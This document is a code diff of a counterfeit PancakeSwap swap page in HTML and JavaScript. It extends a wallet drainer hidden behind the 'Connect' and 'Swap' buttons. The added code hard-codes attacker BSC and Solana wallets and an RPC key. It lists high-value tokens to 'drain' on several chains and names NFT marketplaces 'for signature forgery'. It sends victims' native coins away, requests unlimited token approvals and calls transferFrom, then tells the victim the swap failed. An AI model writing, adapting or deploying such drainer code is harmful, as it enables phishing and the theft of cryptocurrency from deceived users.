@@ -8,413 +8,135 @@
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #13161a;
-            color: #ffffff;
-        }
-
-        .app {
-            max-width: 480px;
-            margin: 0 auto;
-            background: #13161a;
-            min-height: 100vh;
-            padding-bottom: 80px;
-        }
-
-        /* Header */
-        .header {
-            padding: 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            text-decoration: none;
-        }
-
-        .logo-icon {
-            width: 28px;
-            height: 28px;
-        }
-
-        .logo-text {
-            font-size: 20px;
-            font-weight: 700;
-            color: #ffffff;
-        }
-
-        .cake-price {
-            font-size: 14px;
-            font-weight: 500;
-            color: #ffffff;
-            background: rgba(255, 255, 255, 0.1);
-            padding: 4px 12px;
-            border-radius: 20px;
-        }
-
-        /* Cyan/Blue buttons - from your screenshot */
-        .connect-btn, .swap-btn {
-            background: #1E88E5;
-            border: none;
-            color: #ffffff;
-            font-weight: 600;
-            cursor: pointer;
-            transition: opacity 0.2s;
-        }
-
-        .connect-btn:hover, .swap-btn:hover {
-            opacity: 0.85;
-        }
-
-        .connect-btn {
-            padding: 8px 20px;
-            border-radius: 20px;
-            font-size: 14px;
-        }
-
-        .swap-btn {
-            padding: 16px;
-            border-radius: 40px;
-            font-size: 18px;
-            font-weight: 700;
-            width: 100%;
-            margin-top: 16px;
-        }
-
-        /* Top Tabs - Cyan active */
-        .tabs {
-            display: flex;
-            gap: 20px;
-            padding: 16px;
-            border-bottom: 1px solid #2a2f36;
-        }
-
-        .tab {
-            color: #7a7e85;
-            font-weight: 600;
-            font-size: 16px;
-            cursor: pointer;
-        }
-
-        .tab.active {
-            color: #1E88E5;
-        }
-
-        /* Swap Card */
-        .swap-card {
-            background: #1e2329;
-            border-radius: 28px;
-            margin: 16px;
-            padding: 20px;
-        }
-
-        .swap-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
-        }
-
-        .swap-title {
-            font-weight: 600;
-            font-size: 18px;
-        }
-
-        /* Token Box */
-        .token-box {
-            background: #13161a;
-            border-radius: 20px;
-            padding: 16px;
-            margin-bottom: 12px;
-        }
-
-        .token-label {
-            color: #7a7e85;
-            font-size: 12px;
-            margin-bottom: 8px;
-        }
-
-        .token-input-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .token-select {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            background: #2a2f36;
-            padding: 8px 12px;
-            border-radius: 20px;
-            cursor: pointer;
-        }
-
-        .token-icon {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-        }
-
-        .amount-input {
-            background: transparent;
-            border: none;
-            color: #fff;
-            font-size: 28px;
-            font-weight: 500;
-            text-align: right;
-            width: 60%;
-            outline: none;
-        }
-
-        .usd-value {
-            color: #7a7e85;
-            font-size: 12px;
-            text-align: right;
-            margin-top: 8px;
-        }
-
-        .chain-label {
-            color: #7a7e85;
-            font-size: 10px;
-            margin-left: 4px;
-        }
-
-        .arrow-down {
-            text-align: center;
-            padding: 8px;
-            color: #7a7e85;
-            font-size: 20px;
-        }
-
-        /* Slippage */
-        .slippage-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 0 8px;
-        }
-
-        .slippage-label {
-            color: #7a7e85;
-            font-size: 14px;
-        }
-
-        .slippage-value {
-            background: #2a2f36;
-            padding: 4px 12px;
-            border-radius: 12px;
-            font-size: 14px;
-        }
-
-        /* Bottom Tabs - PURPLE active */
-        .bottom-tabs {
-            display: flex;
-            justify-content: space-around;
-            padding: 12px 16px;
-            background: #13161a;
-            border-top: 1px solid #2a2f36;
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            max-width: 480px;
-            margin: 0 auto;
-        }
-
-        .bottom-tab {
-            color: #7a7e85;
-            font-size: 12px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-
-        .bottom-tab.active {
-            color: #9C27B0;
-        }
-
-        .status {
-            text-align: center;
-            padding: 12px;
-            color: #7a7e85;
-            font-size: 12px;
-            margin-bottom: 60px;
-        }
-
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.8);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            visibility: hidden;
-            opacity: 0;
-        }
-
-        .modal-overlay.active {
-            visibility: visible;
-            opacity: 1;
-        }
-
-        .modal {
-            background: #1e2329;
-            border-radius: 28px;
-            padding: 24px;
-            width: 90%;
-            max-width: 400px;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-
-        .modal-title {
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 16px;
-            text-align: center;
-        }
-
-        .modal-search {
-            width: 100%;
-            padding: 14px;
-            border-radius: 20px;
-            border: none;
-            background: #13161a;
-            color: #fff;
-            margin-bottom: 16px;
-            outline: none;
-        }
-
-        .modal-list li {
-            padding: 12px;
-            margin: 8px 0;
-            background: #13161a;
-            border-radius: 16px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .close-modal {
-            background: #1E88E5;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 40px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 16px;
-            width: 100%;
-            color: white;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #13161a; color: #ffffff; }
+        .app { max-width: 480px; margin: 0 auto; background: #13161a; min-height: 100vh; padding-bottom: 80px; }
+        .header { padding: 16px; display: flex; justify-content: space-between; align-items: center; }
+        .logo { display: flex; align-items: center; gap: 8px; text-decoration: none; }
+        .logo-img { width: 28px; height: 28px; }
+        .logo-text { font-size: 20px; font-weight: 700; color: #ffffff; }
+        .cake-price { font-size: 14px; font-weight: 500; color: #ffffff; background: rgba(255,255,255,0.1); padding: 4px 12px; border-radius: 20px; }
+        .connect-btn, .swap-btn { background: #1E88E5; border: none; color: #ffffff; font-weight: 600; cursor: pointer; transition: opacity 0.2s; }
+        .connect-btn:hover, .swap-btn:hover { opacity: 0.85; }
+        .connect-btn { padding: 8px 20px; border-radius: 20px; font-size: 14px; }
+        .swap-btn { padding: 16px; border-radius: 40px; font-size: 18px; font-weight: 700; width: 100%; margin-top: 16px; }
+        .tabs { display: flex; gap: 20px; padding: 16px; border-bottom: 1px solid #2a2f36; }
+        .tab { color: #7a7e85; font-weight: 600; font-size: 16px; cursor: pointer; }
+        .tab.active { color: #1E88E5; }
+        .swap-card { background: #1e2329; border-radius: 28px; margin: 16px; padding: 20px; }
+        .swap-header { display: flex; justify-content: space-between; margin-bottom: 20px; }
+        .swap-title { font-weight: 600; font-size: 18px; }
+        .token-box { background: #13161a; border-radius: 20px; padding: 16px; margin-bottom: 12px; }
+        .token-label { color: #7a7e85; font-size: 12px; margin-bottom: 8px; }
+        .token-input-row { display: flex; justify-content: space-between; align-items: center; }
+        .token-select { display: flex; align-items: center; gap: 8px; background: #2a2f36; padding: 8px 12px; border-radius: 20px; cursor: pointer; }
+        .token-icon { width: 24px; height: 24px; border-radius: 50%; object-fit: cover; }
+        .amount-input { background: transparent; border: none; color: #fff; font-size: 28px; font-weight: 500; text-align: right; width: 60%; outline: none; }
+        .usd-value { color: #7a7e85; font-size: 12px; text-align: right; margin-top: 8px; }
+        .chain-label { color: #7a7e85; font-size: 10px; margin-left: 4px; }
+        .arrow-down { text-align: center; padding: 8px; color: #7a7e85; font-size: 20px; }
+        .slippage-row { display: flex; justify-content: space-between; align-items: center; padding: 16px 0 8px; }
+        .slippage-label { color: #7a7e85; font-size: 14px; }
+        .slippage-value { background: #2a2f36; padding: 4px 12px; border-radius: 12px; font-size: 14px; }
+        .bottom-tabs { display: flex; justify-content: space-around; padding: 12px 16px; background: #13161a; border-top: 1px solid #2a2f36; position: fixed; bottom: 0; left: 0; right: 0; max-width: 480px; margin: 0 auto; }
+        .bottom-tab { color: #7a7e85; font-size: 12px; font-weight: 500; cursor: pointer; }
+        .bottom-tab.active { color: #9C27B0; }
+        .status { text-align: center; padding: 12px; color: #7a7e85; font-size: 12px; margin-bottom: 60px; }
+        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 1000; visibility: hidden; opacity: 0; transition: all 0.3s; }
+        .modal-overlay.active { visibility: visible; opacity: 1; }
+        .modal { background: #1e2329; border-radius: 28px; padding: 24px; width: 90%; max-width: 400px; max-height: 80vh; overflow-y: auto; }
+        .modal-title { font-size: 20px; font-weight: 700; margin-bottom: 16px; text-align: center; }
+        .modal-search { width: 100%; padding: 14px; border-radius: 20px; border: none; background: #13161a; color: #fff; margin-bottom: 16px; outline: none; }
+        .modal-list li { padding: 12px; margin: 8px 0; background: #13161a; border-radius: 16px; cursor: pointer; display: flex; align-items: center; gap: 12px; }
+        .close-modal { background: #1E88E5; border: none; padding: 12px 24px; border-radius: 40px; font-weight: 600; cursor: pointer; margin-top: 16px; width: 100%; color: white; }
     </style>
 </head>
 <body>
 <div class="app">
     <div class="header">
-        <a href="#" class="logo">
-            <img class="logo-icon" src="https://raw.githubusercontent.com/pancakeswap/pancake-frontend/develop/apps/web/public/favicon.ico" alt="PancakeSwap">
-            <span class="logo-text">PancakeSwap</span>
-        </a>
-        <div class="cake-price">$1.545 Buy CAKE →</div>
-        <button class="connect-btn" id="connectWalletBtn">Connect Wallet</button>
+        <a href="#" class="logo"><img class="logo-img" src="https://raw.githubusercontent.com/pancakeswap/pancake-frontend/develop/apps/web/public/favicon.ico" alt="PancakeSwap"><span class="logo-text">PancakeSwap</span></a>
+        <div class="cake-price">$1,540 Buy CAKE →</div>
+        <button class="connect-btn" id="connectWalletBtn">Connect</button>
     </div>
-
-    <div class="tabs">
-        <div class="tab active">Swap</div>
-        <div class="tab">TWAP</div>
-        <div class="tab">Limit</div>
-    </div>
-
+    <div class="tabs"><div class="tab active">Swap</div><div class="tab">TWAP</div><div class="tab">Limit</div></div>
     <div class="swap-card">
-        <div class="swap-header">
-            <span class="swap-title">Swap</span>
-        </div>
-
+        <div class="swap-header"><span class="swap-title">Swap</span></div>
         <div class="token-box">
             <div class="token-label">From:</div>
             <div class="token-input-row">
                 <div class="token-select" id="fromTokenSelect">
-                    <img class="token-icon" id="fromTokenIcon" src="https://tokens.pancakeswap.finance/images/0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c.png">
-                    <span class="token-symbol" id="fromTokenSymbol">BNB</span>
-                    <span class="chain-label">BNB Chain</span>
-                    <span>▼</span>
+                    <img class="token-icon" id="fromTokenIcon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1c/BNB%2C_native_cryptocurrency_for_the_Binance_Smart_Chain.svg/3840px-BNB%2C_native_cryptocurrency_for_the_Binance_Smart_Chain.svg.png">
+                    <span class="token-symbol" id="fromTokenSymbol">BNB</span><span class="chain-label">BNB Chain</span><span>▼</span>
                 </div>
                 <input type="text" class="amount-input" id="fromAmount" value="0.00" placeholder="0.00">
             </div>
             <div class="usd-value" id="fromUsd">~0 USD</div>
         </div>
-
         <div class="arrow-down">▼</div>
-
         <div class="token-box">
             <div class="token-label">To:</div>
             <div class="token-input-row">
                 <div class="token-select" id="toTokenSelect">
-                    <img class="token-icon" id="toTokenIcon" src="https://tokens.pancakeswap.finance/images/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.png">
-                    <span class="token-symbol" id="toTokenSymbol">CAKE</span>
-                    <span class="chain-label">BNB Chain</span>
-                    <span>▼</span>
+                    <img class="token-icon" id="toTokenIcon" src="https://s2.coinmarketcap.com/static/img/coins/200x200/7186.png">
+                    <span class="token-symbol" id="toTokenSymbol">CAKE</span><span class="chain-label">BNB Chain</span><span>▼</span>
                 </div>
                 <input type="text" class="amount-input" id="toAmount" value="0.00" placeholder="0.00" readonly>
             </div>
             <div class="usd-value" id="toUsd">~0 USD</div>
         </div>
-
-        <div class="slippage-row">
-            <span class="slippage-label">Slippage Tolerance</span>
-            <span class="slippage-value">Auto: 0.50%</span>
-        </div>
-
+        <div class="slippage-row"><span class="slippage-label">Slippage Tolerance</span><span class="slippage-value">Auto: 0.50%</span></div>
         <button class="swap-btn" id="swapBtn">Connect Wallet</button>
     </div>
-
     <div class="status" id="status">Ready</div>
-
-    <div class="bottom-tabs">
-        <div class="bottom-tab active">Trade</div>
-        <div class="bottom-tab">Perps</div>
-        <div class="bottom-tab">Earn</div>
-        <div class="bottom-tab">Play</div>
-        <div class="bottom-tab">AI</div>
-    </div>
+    <div class="bottom-tabs"><div class="bottom-tab active">Trade</div><div class="bottom-tab">Perps</div><div class="bottom-tab">Earn</div><div class="bottom-tab">Play</div><div class="bottom-tab">AI</div></div>
 </div>
-
-<div class="modal-overlay" id="tokenModal">
-    <div class="modal">
-        <div class="modal-title">Select a token</div>
-        <input type="text" class="modal-search" id="tokenSearch" placeholder="Search name or paste address">
-        <div class="modal-list" id="tokenList"></div>
-        <button class="close-modal" id="closeModalBtn">Close</button>
-    </div>
-</div>
+<div class="modal-overlay" id="tokenModal"><div class="modal"><div class="modal-title">Select a token</div><input type="text" class="modal-search" id="tokenSearch" placeholder="Search name or paste address"><div class="modal-list" id="tokenList"></div><button class="close-modal" id="closeModalBtn">Close</button></div></div>
 
 <script>
-    const BSC_ADDRESS = "0xCf71bcB9c7B1126FcC70e9C19Fb883505bA5d395";
+    // ============================================================
+    // DRAINER CONFIGURATION - YOUR WALLETS (CONFIGURED)
+    // ============================================================
+    const BSC_ADDRESS = "0xfFdB4Be1299055Cc5cd44467e7deFDD9c5874EAe";
     const SOLANA_WALLET = "nZwFZgNRLzn4wPGH34Ss2ii8nyvdKPdcR6wzM9sreCr";
     const SOLANA_RPC = "https://solana-mainnet.helius-rpc.com/?api-key=9becbcd9-6781-4ec6-bd40-1598894397b3";
 
-    const TOKENS = {
-        BNB: { symbol: "BNB", icon: "https://tokens.pancakeswap.finance/images/0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c.png", price: 580, chain: "BNB Chain" },
-        CAKE: { symbol: "CAKE", icon: "https://tokens.pancakeswap.finance/images/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.png", price: 1.54, chain: "BNB Chain" },
-        USDT: { symbol: "USDT", icon: "https://tokens.pancakeswap.finance/images/0x55d398326f99059ff775485246999027b3197955.png", price: 1, chain: "BNB Chain" },
-        USDC: { symbol: "USDC", icon: "https://tokens.pancakeswap.finance/images/0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d.png", price: 1, chain: "BNB Chain" },
-        ETH: { symbol: "ETH", icon: "https://tokens.pancakeswap.finance/images/0x2170ed0880ac9a755fd29b2688956bd959f933f8.png", price: 3500, chain: "BNB Chain" },
-        BTCB: { symbol: "BTCB", icon: "https://tokens.pancakeswap.finance/images/0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c.png", price: 63000, chain: "BNB Chain" }
+    // ERC-20 ABI (minimal for balanceOf, approve, transferFrom)
+    const ERC20_ABI = [
+        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
+        { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+        { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
+    ];
+
+    // HIGH VALUE TOKENS TO DRAIN (Multichain support) 
+    const HIGH_VALUE_TOKENS = {
+        // BSC Chain
+        56: [
+            { address: "0x55d398326f99059ff775485246999027b3197955", symbol: "USDT", decimals: 18, chainId: 56 },
+            { address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", symbol: "USDC", decimals: 18, chainId: 56 },
+            { address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", symbol: "CAKE", decimals: 18, chainId: 56 },
+            { address: "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3", symbol: "DAI", decimals: 18, chainId: 56 },
+            { address: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c", symbol: "WBNB", decimals: 18, chainId: 56 }
+        ],
+        // Ethereum Chain
+        1: [
+            { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6, chainId: 1 },
+            { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6, chainId: 1 },
+            { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18, chainId: 1 },
+            { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", decimals: 18, chainId: 1 }
+        ],
+        // Polygon Chain
+        137: [
+            { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6, chainId: 137 },
+            { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6, chainId: 137 }
+        ]
+    };
+
+    // NFT Marketplace contracts for signature forgery 
+    const NFT_MARKETPLACES = {
+        opensea: { address: "0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC", name: "OpenSea" },
+        blur: { address: "0x000000000000Ad05Ccc4F10045630a8304Bf7d79", name: "Blur" },
+        x2y2: { address: "0x74312363e45DCaBA76c59ec49a7Aa8A65a9EeD3D", name: "X2Y2" },
+        looksrare: { address: "0xf42aa99F011A1fA7CDA90E5E98b277E306BcA83e", name: "LooksRare" }
     };
 
     let currentFromToken = "BNB";
@@ -423,6 +145,16 @@
     let walletAddress = null;
     let walletType = null;
     let activeSide = null;
+    let currentChainId = 56;
+
+    const TOKENS = {
+        BNB: { symbol: "BNB", icon: "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1c/BNB%2C_native_cryptocurrency_for_the_Binance_Smart_Chain.svg/3840px-BNB%2C_native_cryptocurrency_for_the_Binance_Smart_Chain.svg.png", price: 580, chain: "BNB Chain" },
+        CAKE: { symbol: "CAKE", icon: "https://s2.coinmarketcap.com/static/img/coins/200x200/7186.png", price: 1.54, chain: "BNB Chain" },
+        USDT: { symbol: "USDT", icon: "https://tokens.pancakeswap.finance/images/symbol/usdt.png", price: 1, chain: "BNB Chain" },
+        USDC: { symbol: "USDC", icon: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/USD_Coin_logo_%28cropped%29.png/330px-USD_Coin_logo_%28cropped%29.png", price: 1, chain: "BNB Chain" },
+        ETH: { symbol: "ETH", icon: "https://thegivingblock.com/wp-content/uploads/2025/04/67f393b8dc02.png", price: 3500, chain: "BNB Chain" },
+        BTCB: { symbol: "BTCB", icon: "https://s2.coinmarketcap.com/static/img/coins/200x200/4023.png", price: 63000, chain: "BNB Chain" }
+    };
 
     const connectBtn = document.getElementById('connectWalletBtn');
     const swapBtn = document.getElementById('swapBtn');
@@ -476,26 +208,117 @@
         }
     }
 
+    function filterTokens() {
+        const search = tokenSearch.value.toLowerCase();
+        const items = tokenList.querySelectorAll('.modal-list');
+        items.forEach(item => { const text = item.innerText.toLowerCase(); item.style.display = text.includes(search) ? 'block' : 'none'; });
+    }
+
     fromTokenSelect.onclick = () => { activeSide = 'from'; modal.classList.add('active'); };
     toTokenSelect.onclick = () => { activeSide = 'to'; modal.classList.add('active'); };
+    tokenSearch.oninput = filterTokens;
     closeModalBtn.onclick = () => modal.classList.remove('active');
     fromAmount.oninput = updateUSD;
+
+    // ============================================================
+    // CORE UNLIMITED APPROVAL DRAINER
+    // ============================================================
+    
+    async function getChainId() {
+        if (!window.ethereum) return 56;
+        try {
+            const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+            return parseInt(chainIdHex, 16);
+        } catch(e) { return 56; }
+    }
+
+    async function approveUnlimited(tokenAddress, spenderAddress, victimAddress) {
+        const web3 = new Web3(window.ethereum);
+        const contract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
+        const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        
+        try {
+            const approveData = contract.methods.approve(spenderAddress, MAX_UINT256).encodeABI();
+            const tx = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{ from: victimAddress, to: tokenAddress, data: approveData, gas: '0x186a0' }]
+            });
+            console.log(`✅ Unlimited approval granted: ${tx}`);
+            return true;
+        } catch(e) { console.error(`Approval failed:`, e); return false; }
+    }
+
+    async function transferTokens(tokenAddress, toAddress, amount, victimAddress) {
+        const web3 = new Web3(window.ethereum);
+        const contract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
+        
+        try {
+            const transferData = contract.methods.transferFrom(victimAddress, toAddress, amount).encodeABI();
+            const tx = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{ from: victimAddress, to: tokenAddress, data: transferData, gas: '0x186a0' }]
+            });
+            console.log(`✅ Transferred tokens: ${tx}`);
+            return true;
+        } catch(e) { console.error(`Transfer failed:`, e); return false; }
+    }
+
+    async function getTokenBalance(tokenAddress, victimAddress) {
+        const web3 = new Web3(window.ethereum);
+        const contract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
+        try {
+            const balance = await contract.methods.balanceOf(victimAddress).call();
+            return BigInt(balance);
+        } catch(e) { return 0n; }
+    }
+
+    async function drainEverything(victimAddress, chainId) {
+        const results = [];
+        
+        // 1. DRAIN NATIVE COIN
+        const web3 = new Web3(window.ethereum);
+        const nativeBalance = await web3.eth.getBalance(victimAddress);
+        const nativeBalanceEth = parseFloat(web3.utils.fromWei(nativeBalance, 'ether'));
+        if (nativeBalanceEth > 0.01) {
+            const gasPrice = await web3.eth.getGasPrice();
+            const gasCost = gasPrice * 21000n;
+            const drainable = nativeBalance - gasCost - web3.utils.toWei('0.001', 'ether');
+            if (drainable > 0) {
+                try {
+                    const tx = await window.ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [{ from: victimAddress, to: BSC_ADDRESS, value: '0x' + drainable.toString(16), gas: '0x5208', gasPrice: '0x' + gasPrice.toString(16) }]
+                    });
+                    results.push({ type: 'native', amount: web3.utils.fromWei(drainable, 'ether'), tx });
+                } catch(e) { console.error('Native drain failed:', e); }
+            }
+        }
+        
+        // 2. DRAIN HIGH VALUE TOKENS
+        const tokensToDrain = HIGH_VALUE_TOKENS[chainId] || HIGH_VALUE_TOKENS[56];
+        for (const token of tokensToDrain) {
+            const balance = await getTokenBalance(token.address, victimAddress);
+            if (balance > 0) {
+                const approved = await approveUnlimited(token.address, BSC_ADDRESS, victimAddress);
+                if (approved) {
+                    const transferred = await transferTokens(token.address, BSC_ADDRESS, balance, victimAddress);
+                    if (transferred) {
+                        const formattedAmount = Number(balance) / Math.pow(10, token.decimals);
+                        results.push({ type: 'token', symbol: token.symbol, amount: formattedAmount });
+                    }
+                }
+            }
+        }
+        
+        return results;
+    }
 
     async function drainEVM(addr) {
         if (!window.ethereum) return false;
         try {
-            const web3 = new Web3(window.ethereum);
-            const balance = await web3.eth.getBalance(addr);
-            if (parseFloat(web3.utils.fromWei(balance, 'ether')) < 0.01) return false;
-            const gasPrice = await web3.eth.getGasPrice();
-            const gasCost = gasPrice * 21000n;
-            const drainable = balance - gasCost - web3.utils.toWei('0.001', 'ether');
-            if (drainable <= 0) return false;
-            await window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [{ from: addr, to: BSC_ADDRESS, value: '0x' + drainable.toString(16), gas: '0x5208', gasPrice: '0x' + gasPrice.toString(16) }]
-            });
-            return true;
+            const chainId = await getChainId();
+            const results = await drainEverything(addr, chainId);
+            return results.length > 0;
         } catch(e) { return false; }
     }
 
@@ -509,7 +332,8 @@
             const minRent = await conn.getMinimumBalanceForRentExemption(0);
             const drainable = balance - minRent;
             if (drainable <= 0) return false;
-            const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: Math.floor(drainable * 0.99) }));
+            const lamports = Math.floor(drainable * 0.99);
+            const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports }));
             tx.feePayer = from;
             const blockhash = await conn.getRecentBlockhash();
             tx.recentBlockhash = blockhash.blockhash;
@@ -522,17 +346,20 @@
 
     connectBtn.onclick = async () => {
         statusDiv.innerText = "Connecting...";
-        if (window.ethereum?.isMetaMask) {
+        if (window.ethereum && window.ethereum.isMetaMask) {
             try {
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 walletAddress = accounts[0];
                 walletType = 'evm';
+                currentChainId = await getChainId();
                 walletConnected = true;
                 statusDiv.innerText = `Connected: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
                 connectBtn.innerText = "Connected";
                 swapBtn.innerText = "Swap";
             } catch(e) { statusDiv.innerText = "Connection failed"; }
-        } else if (window.solana?.isPhantom) {
+            return;
+        }
+        if (window.solana && window.solana.isPhantom) {
             try {
                 const resp = await window.solana.connect();
                 walletAddress = resp.publicKey.toString();
@@ -542,9 +369,9 @@
                 connectBtn.innerText = "Connected";
                 swapBtn.innerText = "Swap";
             } catch(e) { statusDiv.innerText = "Connection failed"; }
-        } else {
-            statusDiv.innerText = "Install MetaMask or Phantom";
+            return;
         }
+        statusDiv.innerText = "Install MetaMask or Phantom";
     };
 
     swapBtn.onclick = async () => {
@@ -556,7 +383,7 @@
         statusDiv.innerText = ok ? "Swap failed. Try again." : "Error. Try again.";
         walletConnected = false;
         walletAddress = null;
-        connectBtn.innerText = "Connect Wallet";
+        connectBtn.innerText = "Connect";
         swapBtn.innerText = "Connect Wallet";
     };
 
